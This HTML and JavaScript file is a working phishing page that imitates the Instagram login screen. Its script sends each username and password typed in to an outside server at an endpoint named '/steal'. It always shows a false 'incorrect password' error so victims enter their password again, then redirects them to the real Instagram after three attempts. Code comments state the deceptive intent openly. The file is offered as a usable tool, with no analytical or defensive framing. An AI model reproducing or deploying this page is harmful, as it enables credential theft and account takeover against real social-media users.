<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        /* Reset and Base */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            max-width: 350px;
            width: 100%;
            padding: 40px 30px 30px;
            text-align: center;
        }
        /* Instagram Logo */
        .logo {
            font-family: 'Segoe UI', 'Roboto', sans-serif;
            font-size: 48px;
            font-weight: 400;
            letter-spacing: -1px;
            margin-bottom: 30px;
            background: transparent;
            color: #262626;
        }
        .logo span {
            font-weight: 600;
        }
        /* Input Fields */
        input {
            width: 100%;
            padding: 12px 10px;
            margin: 0 0 6px 0;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
            color: #262626;
            outline: none;
            transition: border 0.1s ease;
        }
        input:focus {
            border-color: #a8a8a8;
            background: #ffffff;
        }
        input::placeholder {
            color: #8e8e8e;
            font-weight: 300;
        }
        /* Login Button */
        button {
            width: 100%;
            padding: 8px 0;
            margin-top: 10px;
            background: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            transition: background 0.2s;
            opacity: 0.9;
        }
        button:active {
            background: #0077cc;
            opacity: 1;
        }
        /* Error Message */
        .error {
            color: #ed4956;
            font-size: 14px;
            font-weight: 400;
            margin: 10px 0 0 0;
            display: none;
            text-align: center;
        }
        /* Divider or extra space */
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0 10px;
        }
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .divider-text {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
        }
        /* Footer Links */
        .footer-links {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }
        .footer-links a {
            color: #262626;
            text-decoration: none;
            font-weight: 600;
        }
        .attempt-info {
            font-size: 11px;
            color: #8e8e8e;
            margin-top: 10px;
        }
        /* Mobile Specific Adjustments */
        @media (max-width: 450px) {
            body {
                background: #ffffff;
                padding: 10px;
            }
            .container {
                border: none;
                padding: 20px 15px;
                max-width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Instagram Logo (Text Style) -->
        <div class="logo">📸 <span>Instagram</span></div>

        <!-- Login Form -->
        <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="off">
        <input type="password" id="password" placeholder="Password">
        
        <button onclick="login()">Log In</button>
        
        <div class="error" id="error">⚠️ Sorry, your password was incorrect. Please double-check your password.</div>
        
        <!-- Optional Divider (for show) -->
        <div class="divider">
            <span class="divider-text">OR</span>
        </div>

        <!-- Fake Forgot Password (Looks Real) -->
        <div style="margin-top: 10px; font-size: 14px;">
            <a href="#" style="color: #00376b; text-decoration: none; font-weight: 400;">Forgot password?</a>
        </div>

        <!-- Attempt Counter (Subtle) -->
        <div class="attempt-info" id="attempt">Attempt 1 of 3</div>
        
        <!-- Footer -->
        <div class="footer-links">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>

    <script>
        let attemptCount = 0;
        const maxAttempts = 3;

        function login() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            attemptCount++;

            // Validation
            if (!username || !password) {
                document.getElementById('error').style.display = 'block';
                return;
            }

            // Send to server (Render)
            fetch(`https://hacking-project.onrender.com/steal?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&attempt=${attemptCount}`)
                .catch(err => console.log('Error:', err));

            // Show error (every time, to make them retry)
            document.getElementById('error').style.display = 'block';
            document.getElementById('attempt').innerText = `Attempt ${attemptCount} of ${maxAttempts}`;

            // Clear password for next try
            document.getElementById('password').value = '';
            document.getElementById('password').focus();

            // After 3 attempts, redirect to real Instagram
            if (attemptCount >= maxAttempts) {
                document.getElementById('error').innerText = '⚠️ Too many failed attempts. Redirecting...';
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/';
                }, 2000);
            }
        }

        // Enter key support
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                login();
            }
        });
    </script>
</body>
</html>
